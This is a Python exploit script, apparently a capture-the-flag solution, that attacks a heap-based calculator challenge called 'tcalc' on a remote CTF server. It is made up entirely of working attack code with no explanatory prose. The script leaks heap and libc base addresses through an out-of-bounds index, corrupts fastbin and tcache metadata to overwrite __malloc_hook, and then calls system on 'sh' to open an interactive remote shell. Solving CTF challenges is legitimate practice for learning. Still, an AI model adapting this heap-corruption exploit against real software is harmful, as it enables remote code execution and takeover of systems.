from ptrlib import *

def new(cnt, nums):
    sock.sendlineafter(">", "1")
    sock.sendlineafter(">", str(cnt))
    for num in nums:
        sock.sendline(str(num))
    return

def show(index):
    sock.sendlineafter(">", "2")
    sock.sendlineafter(">", str(index))
    sock.recvuntil(": ")
    return float(sock.recvline())

def delete(index):
    sock.sendlineafter(">", "3")
    sock.sendlineafter(">", str(index))
    return

#libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
libc_main_arena = 0x3ebc40
#sock = Process("./chall")
one_gadget = [0x10a38c, 0x4f322, 0x4f2c5][1]
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.29.so")
libc_main_arena = 0x1e4c40
sock = Socket("tcalc.forfuture.fluxfingers.net", 1337)
#one_gadget = [0xeafab, 0xcd3b0, 0xcd3ad, 0xcd3aa][1]
#"""
for addr in libc.find("sh\x00"):
    if addr % 8 == 0:
        libc_binsh = addr
        break
else:
    logger.warn("'sh' not found")
    exit()

offset_tcache = (0x555555559010 - 0x555555559260) // 8
offset_eostdi = (0x55555555a2d0 - 0x555555559260) // 8

# leak heap base
for i in range(7):
    new(2, [0, 0]) # 0
    delete(0)
logger.info("tcache is full")
new(2, [0, 2]) # 0
new(2, [0, 0]) # 1
new(2, [0, 0]) # 2
new(0x420 // 8, [0 for i in range(0x420 // 8)]) # 3
new(2, [0x71, 0]) # 4
new(0x60 // 8, [0x21 for i in range(0x60 // 8)]) # 5
for i in range(7):
    new(0x60 // 8, [0x21 for i in range(0x60 // 8)]) # 6
    delete(6)
new(4, [1, 2, 3, 4]) # 6
for i in range(3):
    delete(i)
print((offset_eostdi+4*9))
heap_base = int((show(offset_eostdi + 4 * 9) * 2 - 0x21) - 0x13a0)
logger.info("heap base = " + hex(heap_base))
# leak libc base
delete(3)
new(2, [heap_base + 0x1400, 2]) # 0
libc_base = int(show(offset_eostdi + 4 * 9 + 1) * 2 - 0x431) - libc_main_arena - 96
logger.info("libc base = " + hex(libc_base))
# fastbin corruption attack
delete(5)
delete(0)
new(2, [heap_base + 0x1850, 0]) # 0
delete(offset_eostdi + 4 * 9 + 1)
new(12, [0x71, libc_base + 0x1e4c30 - 0x23] + [0]*10)

new(12, [0]*12)

#target = libc_base + one_gadget
target = libc_base + libc.symbol('__malloc_hook')
x = (target << (3*8)) & ((1 << 64) - 1)
if x >> 63: x = -((((1 << 64) - 1) ^ x) + 1)
new(12, [0, x, target >> (8*5)] + [0]*9)
logger.info("__malloc_hook done")
input("")
# get the shell!
logger.info("system address "+hex(libc_base+libc_binsh))
sock.sendlineafter(">", "1")
sock.sendlineafter(">",  str((libc_base + libc_binsh) // 8 - 1))
sock.interactive()
